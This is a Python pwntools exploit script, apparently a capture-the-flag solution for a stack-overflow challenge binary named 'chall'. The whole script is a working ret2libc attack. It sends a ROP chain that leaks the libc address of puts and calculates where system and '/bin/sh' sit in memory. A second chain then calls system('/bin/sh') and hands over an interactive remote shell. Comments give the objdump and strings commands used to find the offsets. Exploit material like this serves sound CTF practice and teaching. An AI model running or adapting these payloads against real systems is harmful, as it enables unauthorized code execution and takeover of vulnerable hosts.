from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

p = remote("SERVER", PORT)
context.binary = elf


# leaking puts@libc address
payload = b'A' * 72 # padding
payload += p64(0x4007b3) # pop rdi ; ret
payload += p64(0x601018) # puts@GOT into the function argument
payload += p64(0x400580) # puts@plt
payload += p64(0x4006a7) # return to main so we can see output
p.sendline(payload)

# puts@libc leak
p.recvuntil("make it!\n")
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info("Libc puts leak address: " + hex(leak))

# look for offsets
# objdump -T libc.so.6 | grep -E "(system$|puts$)"
libc_puts_offset = 0x87bd0
libc_system_offset = 0x58740

# strings -t x libc.so.6 | grep "/bin/sh"
sh_offset = 0x1cb42f


# calculate for libc base address first
# then calculate for system command and /bin/sh command
libcbase = leak - libc_puts_offset
system = libcbase + libc_system_offset
sh = libcbase + sh_offset

payload2 = b'A' * 72 # padding again
payload2 += p64(0x4007b3) # pop rdi ; ret
payload2 += p64(sh) # shell as argument
payload2 += p64(0x400566) # stack alignment lel
payload2 += p64(system) # system calls shell: system(/bin/sh)

# final
p.sendline(payload2)
p.interactive()